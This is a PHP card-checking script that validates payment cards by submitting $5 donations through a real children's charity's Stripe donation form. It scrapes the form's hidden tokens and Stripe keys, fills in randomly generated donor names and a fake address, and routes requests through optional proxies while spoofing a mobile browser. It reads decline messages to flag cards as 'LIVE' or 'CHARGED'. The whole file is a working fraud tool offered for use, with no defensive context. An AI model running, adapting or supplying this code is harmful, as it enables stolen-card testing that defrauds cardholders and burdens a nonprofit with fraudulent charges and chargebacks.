<?php
// Stripe Donate Gate - Exact Python Script Replica
// Returns JSON response

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    parse_str(file_get_contents('php://input'), $input);
}

$cc = $input['cc'] ?? $_POST['cc'] ?? '';
$proxy = $input['proxy'] ?? $_POST['proxy'] ?? '';

if (empty($cc)) {
    echo json_encode(['success' => false, 'error' => 'No card provided']);
    exit;
}

$parts = explode('|', $cc);
if (count($parts) < 4) {
    echo json_encode(['success' => false, 'error' => 'Invalid card format']);
    exit;
}

list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);

if (strlen($year) == 2) $year = '20' . $year;
$yearTwoDigit = substr($year, -2);
$month = str_pad($month, 2, '0', STR_PAD_LEFT);

// Generate random data matching Python script
$firstNames = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
               "Hannah", "Yara", "Khalid", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania"];
$lastNames = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", 
              "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez"];

$firstName = $firstNames[array_rand($firstNames)];
$lastName = $lastNames[array_rand($lastNames)];
$email = strtolower($firstName) . rand(100, 999) . "@gmail.com";

// Use the exact address from Python script
$street = "New york new states 1000";
$city = "New york";
$state = "NY";
$zip = "10080";

// Step 1: Get donation page
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ourkidsatheart.com/donate-now-austin-chapter/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Upgrade-Insecure-Requests: 1',
    'X-Chrome-offline: persist=0 reason=error',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);

$response = curl_exec($ch);
curl_close($ch);

// Extract form data
preg_match('/name="give-form-id" value="([^"]+)"/', $response, $formIdMatch);
preg_match('/name="give-form-id-prefix" value="([^"]+)"/', $response, $prefixMatch);
preg_match('/name="give-form-hash" value="([^"]+)"/', $response, $hashMatch);
preg_match('/name="give-form-user-register-hash" value="([^"]+)"/', $response, $registerMatch);
preg_match('/data-account="([^"]+)"/', $response, $acctMatch);
preg_match('/data-publishable-key="([^"]+)"/', $response, $pkMatch);
preg_match('/ZeroSpamDavidWalsh\s*=\s*\{.*?"key"\s*:\s*"([^"]+)"/', $response, $spamMatch);

$formId = $formIdMatch[1] ?? '';
$prefix = $prefixMatch[1] ?? '';
$hash = $hashMatch[1] ?? '';
$register = $registerMatch[1] ?? '';
$acct = $acctMatch[1] ?? '';
$pkLive = $pkMatch[1] ?? '';
$spamKey = $spamMatch[1] ?? '';

if (empty($pkLive)) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Failed to get Stripe keys', 'gateway' => 'Stripe Donate $5']);
    exit;
}

// Step 2: Get with params (like Python script)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ourkidsatheart.com/donate-now-austin-chapter/?form-id={$formId}&payment-mode=stripe&level-id=custom&custom-amount=5.00");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: ourkidsatheart.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'referer: https://ourkidsatheart.com/donate-now-austin-chapter/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);

curl_exec($ch);
curl_close($ch);

// Step 3: Create payment method via Stripe API with FULL headers (exact match to Python)
$stripeHeaders = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
];

// Use EXACT same data format as Python script
$stripeData = 'type=card&billing_details[name]=' . urlencode($firstName . ' ' . $lastName) . 
    '&billing_details[email]=' . urlencode($email) . 
    '&billing_details[address][line1]=New+york+new+states+1000' .
    '&billing_details[address][line2]=' .
    '&billing_details[address][city]=New+york' .
    '&billing_details[address][state]=NY' .
    '&billing_details[address][postal_code]=10080' .
    '&billing_details[address][country]=US' .
    '&card[number]=' . $cardNumber .
    '&card[cvc]=' . $cvv .
    '&card[exp_month]=' . $month .
    '&card[exp_year]=' . $yearTwoDigit .
    '&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf' .
    '&muid=307eae68-897f-4b10-ad9a-a0b69db88a781bf452' .
    '&sid=d463b80e-aa03-4183-a9c2-48c200d5cf991f3b50' .
    '&payment_user_agent=stripe.js%2F148043f9d7%3B+stripe-js-v3%2F148043f9d7%3B+split-card-element' .
    '&referrer=https%3A%2F%2Fourkidsatheart.com' .
    '&time_on_page=1303230' .
    '&client_attribution_metadata[client_session_id]=b8f4873e-8566-413e-b9f5-9c0340ab81e9' .
    '&client_attribution_metadata[merchant_integration_source]=elements' .
    '&client_attribution_metadata[merchant_integration_subtype]=split-card-element' .
    '&client_attribution_metadata[merchant_integration_version]=2017' .
    '&key=' . $pkLive .
    '&_stripe_account=' . $acct;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $stripeData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $stripeHeaders);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);

$response = curl_exec($ch);
curl_close($ch);

$pmData = json_decode($response, true);
$paymentMethodId = $pmData['id'] ?? '';

if (empty($paymentMethodId)) {
    $errorMsg = $pmData['error']['message'] ?? 'Payment method creation failed';
    
    $liveIndicators = ['cvv', 'security code', 'insufficient', 'funds', 'invalid', 'declined'];
    foreach ($liveIndicators as $indicator) {
        if (stripos($errorMsg, $indicator) !== false) {
            echo json_encode(['success' => true, 'status' => 'approved', 'message' => "CARD IS LIVE - {$errorMsg}", 'gateway' => 'Stripe Donate $5']);
            exit;
        }
    }
    
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => $errorMsg, 'gateway' => 'Stripe Donate $5']);
    exit;
}

// Step 4: Submit donation with exact Python headers
$donateHeaders = [
    'authority: ourkidsatheart.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://ourkidsatheart.com',
    'referer: https://ourkidsatheart.com/donate-now-austin-chapter/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
];

$params = 'payment-mode=stripe&form-id=' . $formId;

$donateData = [
    'give-honeypot' => '',
    'give-form-id-prefix' => $prefix,
    'give-form-id' => $formId,
    'give-form-title' => 'Donate - Austin',
    'give-current-url' => 'https://ourkidsatheart.com/donate-now-austin-chapter/',
    'give-form-url' => 'https://ourkidsatheart.com/donate-now-austin-chapter/',
    'give-form-minimum' => '5.00',
    'give-form-maximum' => '999999.99',
    'give-form-hash' => $hash,
    'give-price-id' => 'custom',
    'give-recurring-logged-in-only' => '',
    'give-logged-in-only' => '1',
    '_give_is_donation_recurring' => '0',
    'give_recurring_donation_details' => '{"give_recurring_option":"yes_donor"}',
    'give-amount' => '5.00',
    'give-recurring-period-donors-choice' => 'day',
    'give_referral' => $firstName,
    'give_stripe_payment_method' => $paymentMethodId,
    'payment-mode' => 'stripe',
    'give_first' => $firstName,
    'give_last' => $lastName,
    'give_email' => $email,
    'give-form-user-register-hash' => $register,
    'give-purchase-var' => 'needs-to-register',
    'card_name' => $firstName,
    'billing_country' => 'US',
    'card_address' => 'New york new states 1000',
    'card_address_2' => '',
    'card_city' => 'New york',
    'card_state' => 'NY',
    'card_zip' => '10080',
    'give_action' => 'purchase',
    'give-gateway' => 'stripe',
    '71MzG' => '',
    'zerospam_david_walsh_key' => $spamKey
];

$donateDataEncoded = http_build_query($donateData);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ourkidsatheart.com/donate-now-austin-chapter/?" . $params);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $donateDataEncoded);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $donateHeaders);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);

$response = curl_exec($ch);
curl_close($ch);

// Check response like Python script
if (strpos($response, 'Thank you for your donation') !== false || 
    strpos($response, 'Thank you') !== false || 
    strpos($response, 'Successfully') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => 'CHARGED $5 🔥', 'gateway' => 'Stripe Donate $5']);
} elseif (strpos($response, 'requires_action') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => '3D Secure Required (LIVE Card)', 'gateway' => 'Stripe Donate $5']);
} else {
    // Extract error message like Python script
    preg_match('/<strong>Error<\/strong>:\s*(.*?)<\/p>/', $response, $errorMatch);
    $errorMsg = $errorMatch[1] ?? 'Donation failed';
    
    if (strpos($response, 'Your card was declined') !== false) {
        echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Card Declined', 'gateway' => 'Stripe Donate $5']);
    } else {
        $liveIndicators = ['cvv', 'security code', 'insufficient', 'funds', 'invalid', 'incorrect'];
        foreach ($liveIndicators as $indicator) {
            if (stripos($errorMsg, $indicator) !== false) {
                echo json_encode(['success' => true, 'status' => 'approved', 'message' => "CARD IS LIVE - {$errorMsg}", 'gateway' => 'Stripe Donate $5']);
                exit;
            }
        }
        
        echo json_encode(['success' => true, 'status' => 'declined', 'message' => $errorMsg, 'gateway' => 'Stripe Donate $5']);
    }
}
?>
